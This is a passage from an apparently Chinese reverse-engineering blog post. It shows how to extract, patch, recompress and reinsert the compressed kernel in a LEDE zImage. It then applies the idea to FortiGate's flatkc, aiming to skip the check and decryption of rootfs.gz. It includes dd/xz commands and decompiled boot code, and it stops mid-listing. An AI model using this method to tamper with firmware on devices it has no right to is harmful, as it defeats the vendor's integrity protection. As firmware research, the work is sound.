<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.25.1 () built-in shell (ash)</span><br><span class="line"></span><br><span class="line">     _________</span><br><span class="line">    /        /\      _    ___ ___  ___</span><br><span class="line">   /  LE    /  \    | |  | __|   \| __|</span><br><span class="line">  /    DE  /    \   | |__| _|| |) | _|</span><br><span class="line"> /________/  LE  \  |____|___|___/|___|                      lede-project.org</span><br><span class="line"> \        \   DE /</span><br><span class="line">  \    LE  \    /  -----------------------------------------------------------</span><br><span class="line">   \  DE    \  /    Reboot (17.01.0, r3205-59508e3)</span><br><span class="line">    \________\/    -----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">=== WARNING! =====================================</span><br><span class="line">There is no root password defined on this device!</span><br><span class="line">Use the &quot;passwd&quot; command to set up a new password</span><br><span class="line">in order to prevent unauthorized SSH logins.</span><br><span class="line">--------------------------------------------------</span><br><span class="line">root@(none):/#</span><br></pre></td></tr></table></figure></div>

<p>我们希望将 <code>WARNING!</code> 字符串修改为 <code>NORMAL!!</code>。</p>
<p>通过查看 Linux <a class="link"   href="https://elixir.bootlin.com/linux/v4.4.50/source/arch/arm/boot/compressed" >源码目录<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在 zImage 中被压缩的 vmlinux 叫做 Piggy，Piggy 可以由不同的算法压缩，我们下载的镜像使用的压缩算法为 xz</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">15400         0x3C28          xz compressed data</span><br><span class="line">15632         0x3D10          xz compressed data</span><br></pre></td></tr></table></figure></div>

<p>在 piggy.xzkern.S 汇编中看到 Piggy 在 zImage 文件中的位置由 input_data、input_data_end 界定，这些变量在 arch&#x2F;arm&#x2F;boot&#x2F;compressed&#x2F;misc.c 中的 decompress_kernel 函数被引用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">decompress_kernel</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> output_start, <span class="type">unsigned</span> <span class="type">long</span> free_mem_ptr_p,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> free_mem_ptr_end_p,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> arch_id)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	__stack_chk_guard_setup();</span><br><span class="line"></span><br><span class="line">	output_data		= (<span class="type">unsigned</span> <span class="type">char</span> *)output_start;</span><br><span class="line">	free_mem_ptr		= free_mem_ptr_p;</span><br><span class="line">	free_mem_end_ptr	= free_mem_ptr_end_p;</span><br><span class="line">	__machine_arch_type	= arch_id;</span><br><span class="line"></span><br><span class="line">	arch_decomp_setup();</span><br><span class="line"></span><br><span class="line">	putstr(<span class="string">&quot;Uncompressing Linux...&quot;</span>);</span><br><span class="line">	ret = do_decompress(input_data, input_data_end - input_data,</span><br><span class="line">			    output_data, error);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		error(<span class="string">&quot;decompressor returned an error&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		putstr(<span class="string">&quot; done, booting the kernel.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>do_decompress 函数负责对内核文件进行解压，对照源码查看 zImage 的反编译代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decompress_kernel</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> output_start, <span class="type">unsigned</span> <span class="type">int</span> free_mem_ptr_p, <span class="type">unsigned</span> <span class="type">int</span> free_mem_ptr_end_p, <span class="type">int</span> arch_id)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  sub_9AC();</span><br><span class="line">  v5 = <span class="string">&quot;Uncompressing Linux...&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v5++ )</span><br><span class="line">    ;</span><br><span class="line">  result = do_decompress(input_data, <span class="number">0x2BB404</span>, output_start, sub_940);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_940(<span class="string">&quot;decompressor returned an error&quot;</span>);</span><br><span class="line">  v8 = <span class="string">&quot; done, booting the kernel.\n&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v8++ )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样找到了 input_data 和 input_data_end 两个变量的值，也就可以定位到 Piggy 的位置。</p>
<p>将 Piggy 拆出</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=zImage-initramfs of=vmlinux.xz ibs=1 skip=$[0x3d10] count=$[0x2BB404]</span><br></pre></td></tr></table></figure></div>

<p>注意拆分出来的文件是一个正常的 xz 压缩包，但是在末尾多出了 4 个字节，用来存放原始 vmlinux 的大小，这一点可以在<a class="link"   href="https://elixir.bootlin.com/linux/v4.4.50/source/scripts/Makefile.lib#L374" >源码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中看到。因此解压时使用参数 <code>--single-stream</code> 避免出现解压失败的提示。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">unxz --verbose --single-stream vmlinux.xz</span><br></pre></td></tr></table></figure></div>

<p>打开解压得到的 vmlinux，在其中找到想要修改的字符串进行修改，完成之后把 vmlinux 重新压缩回 Piggy （这里使用了 xz 的 nice 参数，以便于让重打包的文档尽可能小于原始文档）</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">xz --check=crc32 --arm --lzma2=,dict=32MiB,<span class="built_in">nice</span>=128 &lt; vmlinux &gt; vmlinux-mod-warntest.xz</span><br></pre></td></tr></table></figure></div>

<p>得到的 xz 文档相比源文档更小</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rw-rw-r--  1 admin admin 2863840  3月 14 18:04 vmlinux-mod-warntest.xz</span><br><span class="line">-rw-rw-r--  1 admin admin 2864132  3月 14 18:05 vmlinux.xz</span><br></pre></td></tr></table></figure></div>

<p>接下来要把修改之后的文档重新塞入 zImage 中，由于新的文档更小，所以不用考虑扩容的问题，缺失的部分使用 00 填充，不会影响 xz 正常解压。不过注意保留原来 xz 文档结尾的 4 个字节。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> zImage-initramfs zImage-initramfs-warnmod</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=zImage-initramfs-warnmod bs=1 seek=$[0x3d10] count=$[0x2bb400] conv=notrunc</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=vmlinux-mod-warntest.xz of=zImage-initramfs-warnmod bs=1 seek=$[0x3d10] conv=notrunc</span><br></pre></td></tr></table></figure></div>

<p>修改之后启动新的镜像</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-arm -serial stdio -M virt -m 1024 -kernel zImage-initramfs-warnmod</span><br></pre></td></tr></table></figure></div>

<p>可以在终端看到修改已经成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.25.1 () built-in shell (ash)</span><br><span class="line"></span><br><span class="line">     _________</span><br><span class="line">    /        /\      _    ___ ___  ___</span><br><span class="line">   /  LE    /  \    | |  | __|   \| __|</span><br><span class="line">  /    DE  /    \   | |__| _|| |) | _|</span><br><span class="line"> /________/  LE  \  |____|___|___/|___|                      lede-project.org</span><br><span class="line"> \        \   DE /</span><br><span class="line">  \    LE  \    /  -----------------------------------------------------------</span><br><span class="line">   \  DE    \  /    Reboot (17.01.0, r3205-59508e3)</span><br><span class="line">    \________\/    -----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">=== NORMAL!! =====================================</span><br><span class="line">There is no root password defined on this device!</span><br><span class="line">Use the &quot;passwd&quot; command to set up a new password</span><br><span class="line">in order to prevent unauthorized SSH logins.</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure></div>

<p>基于以上思路，猜测对 FortiGate 的 flatkc 也可以执行类似的操作，先将 Piggy 取出，解压后把校验和解密 rootfs.gz 的函数跳过，再将内核重新压缩并塞回 flatkc 中。</p>
<p>flatkc 是一个 x86 镜像，所以在 Linux 源码中找到 arch&#x2F;x86&#x2F;boot&#x2F;compressed 目录，在 misc.c 中找到了叫做 extract_kernel 的函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> *<span class="title function_">extract_kernel</span><span class="params">(<span class="type">void</span> *rmode, memptr heap,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">char</span> *input_data,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">long</span> input_len,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">char</span> *output,</span></span><br><span class="line"><span class="params">				  <span class="type">unsigned</span> <span class="type">long</span> output_len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> kernel_total_size = VO__end - VO__text;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> virt_addr = LOAD_PHYSICAL_ADDR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Retain x86 boot parameters pointer passed from startup_32/64. */</span></span><br><span class="line">	boot_params = rmode;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Clear flags intended for solely in-kernel use. */</span></span><br><span class="line">	boot_params-&gt;hdr.loadflags &amp;= ~KASLR_FLAG;</span><br><span class="line"></span><br><span class="line">	sanitize_boot_params(boot_params);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (boot_params-&gt;screen_info.orig_video_mode == <span class="number">7</span>) &#123;</span><br><span class="line">		vidmem = (<span class="type">char</span> *) <span class="number">0xb0000</span>;</span><br><span class="line">		vidport = <span class="number">0x3b4</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		vidmem = (<span class="type">char</span> *) <span class="number">0xb8000</span>;</span><br><span class="line">		vidport = <span class="number">0x3d4</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lines = boot_params-&gt;screen_info.orig_video_lines;</span><br><span class="line">	cols = boot_params-&gt;screen_info.orig_video_cols;</span><br><span class="line"></span><br><span class="line">	console_init();</span><br><span class="line">	debug_putstr(<span class="string">&quot;early console in extract_kernel\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	free_mem_ptr     = heap;	<span class="comment">/* Heap */</span></span><br><span class="line">	free_mem_end_ptr = heap + BOOT_HEAP_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Report initial kernel position details. */</span></span><br><span class="line">	debug_putaddr(input_data);</span><br><span class="line">	debug_putaddr(input_len);</span><br><span class="line">	debug_putaddr(output);</span><br><span class="line">	debug_putaddr(output_len);</span><br><span class="line">	debug_putaddr(kernel_total_size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="comment">/* Report address of 32-bit trampoline */</span></span><br><span class="line">	debug_putaddr(trampoline_32bit);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The memory hole needed for the kernel is the larger of either</span></span><br><span class="line"><span class="comment">	 * the entire decompressed kernel plus relocation table, or the</span></span><br><span class="line"><span class="comment">	 * entire decompressed kernel plus .bss and .brk sections.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	choose_random_location((<span class="type">unsigned</span> <span class="type">long</span>)input_data, input_len,</span><br><span class="line">				(<span class="type">unsigned</span> <span class="type">long</span> *)&amp;output,</span><br><span class="line">				max(output_len, kernel_total_size),</span><br><span class="line">				&amp;virt_addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate memory location choices. */</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)output &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination physical address inappropriately aligned&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address inappropriately aligned&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="keyword">if</span> (heap &gt; <span class="number">0x3fffffffffff</span>UL)</span><br><span class="line">		error(<span class="string">&quot;Destination address too large&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr + max(output_len, kernel_total_size) &gt; KERNEL_IMAGE_SIZE)</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address is beyond the kernel mapping area&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">if</span> (heap &gt; ((-__PAGE_OFFSET-(<span class="number">128</span>&lt;&lt;<span class="number">20</span>)<span class="number">-1</span>) &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">		error(<span class="string">&quot;Destination address too large&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_RELOCATABLE</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)output != LOAD_PHYSICAL_ADDR)</span><br><span class="line">		error(<span class="string">&quot;Destination address does not match LOAD_PHYSICAL_ADDR&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (virt_addr != LOAD_PHYSICAL_ADDR)</span><br><span class="line">		error(<span class="string">&quot;Destination virtual address changed when not relocatable&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	debug_putstr(<span class="string">&quot;\nDecompressing Linux... &quot;</span>);</span><br><span class="line">	__decompress(input_data, input_len, <span class="literal">NULL</span>, <span class="literal">NULL</span>, output, output_len,</span><br><span class="line">			<span class="literal">NULL</span>, error);</span><br><span class="line">	parse_elf(output);</span><br><span class="line">	handle_relocations(output, output_len, virt_addr);</span><br><span class="line">	debug_putstr(<span class="string">&quot;done.\nBooting the kernel.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过搜索函数出现的一些字符串，在 flatkc 中找到了该函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 *__fastcall <span class="title function_">extract_kernel</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *rmode,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *heap,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 *input_data,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> input_len,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 *output,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> output_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v8 = heap;</span><br><span class="line">  v11 = rmode;</span><br><span class="line">  *(rmode + <span class="number">529</span>) &amp;= ~<span class="number">2u</span>;</span><br><span class="line">  v12 = *(rmode + <span class="number">495</span>) == <span class="number">0</span>;</span><br><span class="line">  qword_700690 = rmode;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">192</span>, <span class="number">0</span>, <span class="number">256LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">491</span>, <span class="number">0</span>, <span class="number">6LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">616</span>, <span class="number">0</span>, <span class="number">40LL</span>);</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">3280</span>, <span class="number">0</span>, <span class="number">48LL</span>);</span><br><span class="line">    heap = <span class="number">0LL</span>;</span><br><span class="line">    sub_6E6A00(rmode + <span class="number">3820</span>, <span class="number">0</span>, <span class="number">276LL</span>);</span><br><span class="line">    v11 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11[<span class="number">6</span>] == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_7006B8 = <span class="number">720896LL</span>;</span><br><span class="line">    dword_7006B0 = <span class="number">948</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    qword_7006B8 = <span class="number">753664LL</span>;</span><br><span class="line">    dword_7006B0 = <span class="number">980</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_7006AC = v11[<span class="number">14</span>];</span><br><span class="line">  dword_7006A8 = v11[<span class="number">7</span>];</span><br><span class="line">  sub_6E6F90();</span><br><span class="line">  qword_700688 = v8;</span><br><span class="line">  qword_700680 = v8 + <span class="number">0x10000</span>;</span><br><span class="line">  v13 = &amp;unk_1826000;</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;output_len &gt;= <span class="number">0x1826000</span>uLL )</span><br><span class="line">    v13 = *&amp;output_len;</span><br><span class="line">  <span class="keyword">if</span> ( (output &amp; <span class="number">0x1FFFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;Destination physical address inappropriately aligned&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0x3FFFFFFFFFFF</span>LL )</span><br><span class="line">    error(<span class="string">&quot;Destination address too large&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( v13 + <span class="number">0x200000</span> &gt; <span class="number">0x20000000</span> )            <span class="comment">// KERNEL_IMAGE_SIZE</span></span><br><span class="line">    error(<span class="string">&quot;Destination virtual address is beyond the kernel mapping area&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( output != LOAD_PHYSICAL_ADDR )</span><br><span class="line">    error(<span class="string">&quot;Destination address does not match LOAD_PHYSICAL_ADDR&quot;</span>, heap);</span><br><span class="line">  v14 = input_data;</span><br><span class="line">  <span class="keyword">if</span> ( !input_data )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">malloc</span>(<span class="number">0x4000</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      error(<span class="string">&quot;Out of memory while allocating input buffer&quot;</span>, heap);</span><br><span class="line">    *&amp;input_len = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = <span class="built_in">malloc</span>(<span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    error(<span class="string">&quot;Out of memory while allocating z_stream&quot;</span>, heap);</span><br><span class="line">  v16 = <span class="built_in">malloc</span>(<span class="number">0x2548</span>uLL);</span><br><span class="line">  v15[<span class="number">8</span>] = v16;</span><br><span class="line">  v18 = v16;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    error(<span class="string">&quot;Out of memory while allocating workspace&quot;</span>, heap);</span><br><span class="line">  <span class="keyword">if</span> ( !*&amp;input_len )</span><br><span class="line">  &#123;</span><br><span class="line">    heap = sub_4000;</span><br><span class="line">    *&amp;input_len = fill(v14, <span class="number">0x4000</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;input_len &lt;= <span class="number">9</span> || *v14 != <span class="number">31</span> || v14[<span class="number">1</span>] != <span class="number">0x8B</span> || v14[<span class="number">2</span>] != <span class="number">8</span> )</span><br><span class="line">    error(<span class="string">&quot;Not a gzip file&quot;</span>, heap);</span><br><span class="line">  v19 = *&amp;input_len - <span class="number">10LL</span>;</span><br><span class="line">  *v15 = v14 + <span class="number">10</span>;</span><br><span class="line">  v15[<span class="number">1</span>] = v19;</span><br><span class="line">  <span class="keyword">if</span> ( (v14[<span class="number">3</span>] &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">        error(<span class="string">&quot;header error&quot;</span>, heap);</span><br><span class="line">      v20 = *v15;</span><br><span class="line">      v15[<span class="number">1</span>] = --v19;</span><br><span class="line">      *v15 = v20 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v20 );</span><br><span class="line">  &#125;</span><br><span class="line">  v15[<span class="number">7</span>] = v18;</span><br><span class="line">  v15[<span class="number">3</span>] = <span class="number">0x200000</span>LL;</span><br><span class="line">  v15[<span class="number">4</span>] = v17;</span><br><span class="line">  v15[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v18[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v18[<span class="number">10</span>] = <span class="number">15</span>;</span><br><span class="line">  *(v18 + <span class="number">7</span>) = v15[<span class="number">8</span>] + <span class="number">9544LL</span>;</span><br><span class="line">  v21 = sub_6E4440(v15);</span><br><span class="line">  *(v15[<span class="number">8</span>] + <span class="number">44LL</span>) = <span class="number">0</span>;</span><br><span class="line">  *(v15[<span class="number">8</span>] + <span class="number">56LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v15[<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = fill(v14, <span class="number">0x4000</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( v22 &lt; <span class="number">0</span> )</span><br><span class="line">          error(<span class="string">&quot;read error&quot;</span>, <span class="number">0x4000</span>LL);</span><br><span class="line">        *v15 = v14;</span><br><span class="line">        v15[<span class="number">1</span>] = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      v23 = sub_6E4540(v15, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        error(<span class="string">&quot;uncompression error&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_700698 = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !input_data )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_700698 = <span class="number">-3</span>;</span><br><span class="line">    qword_7006A0 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_6E6A90(v29, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  <span class="keyword">if</span> ( v29[<span class="number">0</span>] != <span class="number">1179403647</span> )</span><br><span class="line">    error(<span class="string">&quot;Kernel is not a valid ELF file&quot;</span>, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  v24 = <span class="built_in">malloc</span>(<span class="number">56</span> * v31);</span><br><span class="line">  v25 = v24;</span><br><span class="line">  <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    error(<span class="string">&quot;Failed to allocate space for phdrs&quot;</span>, LOAD_PHYSICAL_ADDR);</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v27 = v30 + <span class="number">0x200000</span>;</span><br><span class="line">  sub_6E6A90(v24, v30 + <span class="number">0x200000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v25[<span class="number">12</span>] &amp; <span class="number">0x1FFFFF</span>) != <span class="number">0</span> )</span><br><span class="line">          error(<span class="string">&quot;Alignment of LOAD segment isn&#x27;t multiple of 2MB&quot;</span>, v27);</span><br><span class="line">        v27 = *(v25 + <span class="number">1</span>) + <span class="number">0x200000</span>LL;</span><br><span class="line">        sub_6E6A30(*(v25 + <span class="number">3</span>), v27);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v26;</span><br><span class="line">      v25 += <span class="number">14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v26 &lt; v31 );</span><br><span class="line">  &#125;</span><br><span class="line">  dword_700698 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> LOAD_PHYSICAL_ADDR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>观察发现函数开头和源码大致相同，但后面出现了一些和 gzip 解压相关的代码，搜索字符串在 decompress_inflate.c 找到的相关定义</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">int</span> INIT __gunzip(<span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">long</span> len,</span><br><span class="line">		       <span class="type">long</span> (*fill)(<span class="type">void</span>*, <span class="type">unsigned</span> <span class="type">long</span>),</span><br><span class="line">		       <span class="type">long</span> (*flush)(<span class="type">void</span>*, <span class="type">unsigned</span> <span class="type">long</span>),</span><br><span class="line">		       <span class="type">unsigned</span> <span class="type">char</span> *out_buf, <span class="type">long</span> out_len,</span><br><span class="line">		       <span class="type">long</span> *pos,</span><br><span class="line">		       <span class="type">void</span>(*error)(<span class="type">char</span> *x)) &#123;</span><br><span class="line">	u8 *zbuf;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">z_stream_s</span> *<span class="title">strm</span>;</span></span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	rc = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (flush) &#123;</span><br><span class="line">		out_len = <span class="number">0x8000</span>; <span class="comment">/* 32 K */</span></span><br><span class="line">		out_buf = <span class="built_in">malloc</span>(out_len);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!out_len)</span><br><span class="line">			out_len = ((<span class="type">size_t</span>)~<span class="number">0</span>) - (<span class="type">size_t</span>)out_buf; <span class="comment">/* no limit */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!out_buf) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating output buffer&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (buf)</span><br><span class="line">		zbuf = buf;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		zbuf = <span class="built_in">malloc</span>(GZIP_IOBUF_SIZE);</span><br><span class="line">		len = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!zbuf) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating input buffer&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*strm));</span><br><span class="line">	<span class="keyword">if</span> (strm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating z_stream&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem3;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strm-&gt;workspace = <span class="built_in">malloc</span>(flush ? zlib_inflate_workspacesize() :</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> inflate_state));</span><br><span class="line">	<span class="keyword">if</span> (strm-&gt;workspace == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error(<span class="string">&quot;Out of memory while allocating workspace&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> gunzip_nomem4;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!fill)</span><br><span class="line">		fill = nofill;</span><br><span class="line"></span><br><span class="line">	